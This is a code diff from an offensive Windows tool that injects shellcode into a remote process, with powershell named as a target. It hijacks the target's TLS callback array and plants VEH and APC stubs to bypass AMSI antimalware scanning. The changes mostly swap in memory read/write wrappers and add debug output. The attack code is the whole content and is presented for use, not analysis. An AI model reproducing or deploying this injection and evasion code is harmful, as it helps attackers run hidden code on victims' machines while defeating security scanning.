@@ -41,10 +41,11 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR*
     printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
     // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
     // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)
-
     PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, local_tls_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteTLSCallback) return FALSE;
-    WrapperWriteProcessMemory(hProcess, pRemoteTLSCallback, local_tls_bin, local_tls_bin_len, NULL);
+    WriteToTargetProcess(hProcess, pRemoteTLSCallback, local_tls_bin, local_tls_bin_len);
+
+    printf("[*] TLS callback shellcode written to remote process at 0x%p\n", pRemoteTLSCallback);
     
     DWORD oldTlsProtect;
     if (!WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, local_tls_bin_len, PAGE_EXECUTE_READ, &oldTlsProtect)) {
@@ -52,39 +53,50 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR*
         return FALSE;
     }
 
+    printf("[*] TLS callback memory protection set to PAGE_EXECUTE_READ\n");
+
     //We Get the remote TLS directory
     IMAGE_DOS_HEADER dosHdr = {0};
-    if (!WrapperReadProcessMemory(hProcess, ImageBase, &dosHdr, sizeof(IMAGE_DOS_HEADER), NULL)) return FALSE;
+    if (!ReadFromTargetProcess(hProcess, ImageBase, &dosHdr, sizeof(IMAGE_DOS_HEADER))) {
+        printf("[-] Failed to read DOS Header at %p\n", ImageBase);
+        return FALSE;
+    }
 
     PVOID pRemoteNtHdr = (PBYTE)ImageBase + dosHdr.e_lfanew;
     IMAGE_NT_HEADERS64 ntHdr = {0};
-    if (!WrapperReadProcessMemory(hProcess, pRemoteNtHdr, &ntHdr, sizeof(IMAGE_NT_HEADERS64), NULL)) return FALSE;
+    if (!ReadFromTargetProcess(hProcess, pRemoteNtHdr, &ntHdr, sizeof(IMAGE_NT_HEADERS64))) {
+        printf("[-] Failed to read NT Headers at %p\n", pRemoteNtHdr);
+        return FALSE;
+    }
+
+    printf("[*] Remote ImageBase: 0x%p\n", ImageBase);
 
     DWORD tlsRva = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
     if (tlsRva == 0) {
         printf("[-] Target process has no TLS directory. TLS Hijacking aborted.\n");
         return FALSE; // Si pas de TLS, il faut utiliser Early Bird APC
     }
+    printf("[*] Remote TLS Directory RVA: 0x%X\n", ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
 
     PVOID pRemoteTlsDir = (PBYTE)ImageBase + tlsRva;
     IMAGE_TLS_DIRECTORY64 tlsDir = {0};
-    if (!WrapperReadProcessMemory(hProcess, pRemoteTlsDir, &tlsDir, sizeof(IMAGE_TLS_DIRECTORY64), NULL)) return FALSE;
+    if (!ReadFromTargetProcess(hProcess, pRemoteTlsDir, &tlsDir, sizeof(IMAGE_TLS_DIRECTORY64))) return FALSE;
+
+    printf("[*] Remote TLS Directory read successfully.\n");
     
     PVOID pRemoteCallbacksArray = (PVOID)tlsDir.AddressOfCallBacks; // Is VA not RVA
     INT callbackCount = 0;
     PVOID tempPtr = NULL;
+    printf("[*] Remote TLS Callbacks Array Address: 0x%p\n", pRemoteCallbacksArray);
+    printf("[*] Scanning existing TLS callbacks...\n");
     
     // Check if the array pointer is valid before iterating
     if (pRemoteCallbacksArray != NULL) {
         while (TRUE) {
             // Read the table until we find a NULL entry
-            if (!WrapperReadProcessMemory(
-                    hProcess, 
-                    (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), 
-                    &tempPtr, 
-                    sizeof(PVOID), 
-                    NULL)) 
+            if (!ReadFromTargetProcess(hProcess, (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), &tempPtr, sizeof(PVOID))) 
             {
+                printf("[-] Failed to read TLS callback pointer at index %d.\n", callbackCount);
                 return FALSE; // Erreur de lecture
             }
             
@@ -100,7 +112,7 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR*
     
     //Copy existing Callback Arrays
     if (callbackCount > 0) {
-        WrapperReadProcessMemory(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID), NULL);
+        ReadFromTargetProcess(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID));
     }
     //Add our callback at the end of the array
     localNewArray[callbackCount] = (PBYTE) pRemoteTLSCallback; // Our callback
@@ -111,7 +123,7 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR*
         HeapFree(GetProcessHeap(), 0, localNewArray);
         return FALSE;
     }
-    WrapperWriteProcessMemory(hProcess, pRemoteNewArray, localNewArray, newArraySize, NULL);
+    WriteToTargetProcess(hProcess, pRemoteNewArray, localNewArray, newArraySize);
     HeapFree(GetProcessHeap(), 0, localNewArray);
 
     DWORD oldProtectArray;
@@ -125,12 +137,13 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR*
         return FALSE;
     }
 
-    WrapperWriteProcessMemory(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID), NULL);
+    WriteToTargetProcess(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID));
 
-    // FIX: Maintained wrapper consistency (avoid raw VirtualProtectEx when Wrapper exists)
     WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);
 
     printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");
+    printf("[*] Breakpoint target: AddressOfCallBacks field is at 0x%p\n", pRemoteAddressOfCallBacksField);
+    printf("[*] Value written: 0x%p\n", pRemoteNewArray);
 
     return pRemoteTLSCallback;
 }
@@ -196,7 +209,7 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteVeh) goto cleanup; // Goto used for clean heap freeing
 
-    WrapperWriteProcessMemory(hProcess, pRemoteVeh, local_veh_bin, veh_bin_len, NULL);
+    WriteToTargetProcess(hProcess, pRemoteVeh, local_veh_bin, veh_bin_len);
     
     DWORD oldProtect;
     WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);
@@ -210,7 +223,7 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteApc) goto cleanup;
 
-    WrapperWriteProcessMemory(hProcess, pRemoteApc, local_apc_bin, apc_bin_len, NULL);
+    WriteToTargetProcess(hProcess, pRemoteApc, local_apc_bin, apc_bin_len);
     WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
     printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
